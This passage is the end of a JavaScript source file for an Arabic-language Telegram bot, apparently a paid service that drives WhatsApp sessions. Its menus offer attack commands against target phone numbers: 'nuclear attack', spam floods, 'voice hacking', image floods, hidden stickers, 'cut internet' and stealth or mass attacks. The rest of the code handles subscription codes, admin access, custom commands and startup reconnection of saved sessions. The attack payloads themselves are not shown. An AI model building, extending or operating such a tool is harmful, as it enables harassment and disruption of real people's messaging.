    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("attack_cutnet", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🔌 <b>قطع الإنترنت</b>\n\n130+ حزمة بيانات.\n\nاستخدم: <code>/cutinternet 628xxxxxxxx</code>",
    { parse_mode: "HTML", reply_markup: getAttackKeyboard(ctx.from.id.toString()) }
  );
});

// Manage codes
bot.callbackQuery("manage_codes", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للمالك فقط!", { show_alert: true });
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🎫 <b>إدارة رموز الاشتراك</b>\n\n• <code>/makencode 24</code> - إنشاء رمز\n• <code>/listcodes</code> - عرض الرموز\n• <code>/delcode XZ-ABCD12</code> - حذف رمز",
    { parse_mode: "HTML", reply_markup: getSettingsKeyboard(ctx.from.id.toString()) }
  );
});

// Missing callbacks
bot.callbackQuery("error_channel", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId) && !isAdmin(userId)) return ctx.answerCallbackQuery("❌ مخصص للملك والمسؤولين فقط!", { show_alert: true });
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "📡 <b>قناة الأخطاء</b>\n\nجميع أخطاء البوت تُرسل تلقائياً لهذه القناة.\n\nقناة الأخطاء: @sanadcrash_errors",
    { parse_mode: "HTML", reply_markup: getDeveloperKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("admin_broadcast", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId) && !isAdmin(userId)) return ctx.answerCallbackQuery("❌ مخصص للملك والمسؤولين فقط!", { show_alert: true });
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "📨 <b>بث جماعي</b>\n\nاستخدم: <code>/broadcast رسالتك</code>",
    { parse_mode: "HTML", reply_markup: getAdminKeyboard(ctx.from.id.toString()) }
  );
});

bot.callbackQuery("admin_killall", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للملك فقط!", { show_alert: true });
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🔌 <b>Kill All Sessions</b>\n\n⚠️ هل أنت متأكد؟",
    { parse_mode: "HTML",
      reply_markup: new InlineKeyboard()
        .text("✅ نعم", "confirm_clear_all")
        .text("❌ لا", "back_to_main")
    }
  );
});

bot.callbackQuery("admin_stats", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId) && !isAdmin(userId)) return ctx.answerCallbackQuery("❌ مخصص للملك والمسؤولين فقط!", { show_alert: true });
  await ctx.answerCallbackQuery();
  const uptime = formatUptime(process.uptime());
  const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
  await ctx.editMessageText(
    `📊 <b>إحصائيات</b>\n⏱️ ${uptime}\n💾 ${memUsed} MB\n👥 ${usersDb.length} users\n📱 ${Object.keys(waClients).length} sessions`,
    { parse_mode: "HTML", reply_markup: getAdminKeyboard(ctx.from.id.toString()) }
  );
});

// Manage commands
// Manage commands
bot.callbackQuery("manage_commands", async (ctx) => {
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "➕➖ <b>إدارة الأوامر</b>\n\n📋 جميع الأوامر المتاحة:\n• /nuke - هجوم نووي (500)\n• /spam - سبام (2000)\n• /call - قرصنة صوتية (500)\n• /media - فيضان صور (1000)\n• /sticker - ستكرات مخفية (2000)\n• /cutinternet - قطع الإنترنت (130+)\n• /invisisendx - رسائل مخفية (1000)\n• /ghost - هجوم خفي (500)\n• /mass - هجوم متعدد\n• /shield - درع حماية\n• /stealth - وضع التسلل\n\nلإضافة/حذف أمر:\n<code>/addcmd name</code> أو <code>/delcmd name</code>",
    { parse_mode: "HTML", reply_markup: getSettingsKeyboard(ctx.from.id.toString()) }
  );
});

// Manage codes
bot.callbackQuery("manage_codes", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للمالك فقط!", { show_alert: true });
  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🎫 <b>إدارة رموز الاشتراك</b>\n\n• <code>/makencode 24</code> - إنشاء رمز\n• <code>/listcodes</code> - عرض الرموز\n• <code>/delcode XZ-ABCD12</code> - حذف رمز",
    { parse_mode: "HTML", reply_markup: getSettingsKeyboard(ctx.from.id.toString()) }
  );
});

// =====================================================================
// COMMAND: /addcmd (Add Custom Command)
// =====================================================================
bot.command("addcmd", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ مخصص للمالك أو المسؤول!");
  const args = ctx.message.text.split(" ");
  const cmdName = args[1];
  const response = args.slice(2).join(" ");
  if (!cmdName || !response) return ctx.reply("⚠️ الاستخدام: <code>/addcmd name response</code>");
  const db = safeReadJSON("./storage/customCommands.json", { commands: [] });
  if (db.commands.find(c => c.name === cmdName.toLowerCase())) return ctx.reply("⚠️ الأمر موجود بالفعل");
  db.commands.push({ name: cmdName.toLowerCase(), response, createdBy: userId, createdAt: Date.now(), enabled: true });
  safeWriteJSON("./storage/customCommands.json", db);
  ctx.reply(`✅ تم إضافة الأمر /${cmdName}`);
});

// =====================================================================
// COMMAND: /delcmd (Delete Custom Command)
// =====================================================================
bot.command("delcmd", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ مخصص للمالك أو المسؤول!");
  const cmdName = ctx.message.text.split(" ")[1];
  if (!cmdName) return ctx.reply("⚠️ الاستخدام: <code>/delcmd name</code>");
  const db = safeReadJSON("./storage/customCommands.json", { commands: [] });
  const before = db.commands.length;
  db.commands = db.commands.filter(c => c.name !== cmdName.toLowerCase());
  if (db.commands.length !== before) { safeWriteJSON("./storage/customCommands.json", db); ctx.reply(`🗑 تم حذف الأمر /${cmdName}`); }
  else ctx.reply("❌ الأمر غير موجود");
});

// =====================================================================
// COMMAND: /delcode (Delete Subscription Code)
// =====================================================================
bot.command("delcode", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");
  const code = ctx.message.text.split(" ")[1];
  if (!code) return ctx.reply("⚠️ الاستخدام: <code>/delcode XZ-ABCD12</code>");
  const db = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
  const before = db.codes.length;
  db.codes = db.codes.filter(c => c.code !== code.toUpperCase());
  if (db.codes.length !== before) { safeWriteJSON("./storage/subscription_codes.json", db); ctx.reply(`🗑 تم حذف الرمز ${code}`); }
  else ctx.reply("❌ الرمز غير موجود");
});

// =====================================================================
// COMMAND: /addadmin (Alias already defined, this is the same)
// =====================================================================

// =====================================================================
// Generic command handler for custom commands
// =====================================================================
bot.hears(/.*/, async (ctx) => {
  try {
    const cmd = ctx.message.text.trim();
    const customDb = safeReadJSON("./storage/customCommands.json", { commands: [] });
    const customCmd = customDb.commands.find(c => c.name === cmd.toLowerCase() && c.enabled);
    if (customCmd) return ctx.reply(customCmd.response);
  } catch {}
});

// =====================================================================
// Process Handlers
// =====================================================================

process.on("unhandledRejection", async (reason) => {
  log.error(`Unhandled Rejection: ${reason}`);
  try { await bot.api.sendMessage(ERROR_CHANNEL, `🔴 <b>Unhandled Rejection</b>\n\n\`\`\`${reason}\`\`\``, { parse_mode: "HTML" }).catch(() => {}); } catch {}
  bot.api.sendMessage(config.ownerId || "6707747395", `⚠️ Unhandled Rejection: ${reason}`).catch(() => {});
});
process.on("uncaughtException", async (err) => {
  log.error(`Uncaught Exception: ${err.message}`);
  try { await bot.api.sendMessage(ERROR_CHANNEL, `🔴 <b>Uncaught Exception</b>\n\n\`\`\`${err.message}\`\`\``, { parse_mode: "HTML" }).catch(() => {}); } catch {}
  bot.api.sendMessage(config.ownerId || "6707747395", `🔥 Uncaught Exception: ${err.message}`).catch(() => {});
});

// =====================================================================
// Bot Startup
// =====================================================================

(async () => {
  try {
    console.clear();
    log.system("🚀 Bot initialization started...");
    log.telegram("🤖 Telegram Bot with grammY is running!");
    log.success("✅ All systems operational");
    log.info(`👥 Owner: ${config.ownerId}`);
    log.info(`📢 Channel: @${CHANNEL_ID}`);

    const sessionFolders = fs.existsSync(SESSION_DIR) ? fs.readdirSync(SESSION_DIR) : [];
    if (sessionFolders.length > 0) {
      log.loading(`Found ${sessionFolders.length} saved WhatsApp session(s)...`);
      for (const folder of sessionFolders) {
        try { await initWhatsappForUser(folder, false); log.whatsapp(`Reconnecting: ${folder}`); } catch (err) { log.error(`Failed: ${folder}: ${err.message}`); }
      }
    }

    await bot.start();
    console.log(chalk.gray(`\n[${new Date().toLocaleString()}] Bot ready to serve\n`));
    log.success("✅ Bot started successfully!");
  } catch (err) {
    log.error(`Startup error: ${err.message}`);
  }
})();

// =====================================================================
// =====================================================================
// Global Error Handler
// =====================================================================

bot.catch((err) => {
  log.error(`Global catch: ${err.message}`);
  logErrorToChannel(err, "global");
});

// =====================================================================
// Graceful Shutdown
// =====================================================================

async function gracefulShutdown() {
  log.warning("🛑 Shutting down...");
  for (const [userId, data] of Object.entries(waClients)) {
    try { if (data.sock) await data.sock.end(); } catch {}
  }
  log.success("✅ All sessions closed. Goodbye!");
  process.exit(0);
}
process.on("SIGINT", gracefulShutdown);
process.on("SIGTERM", gracefulShutdown);

// =====================================================================
// End of File
// =====================================================================
log.success("✅ All commands loaded successfully!");
module.exports = { bot, waClients, initWhatsappForUser, clearAllSessions };
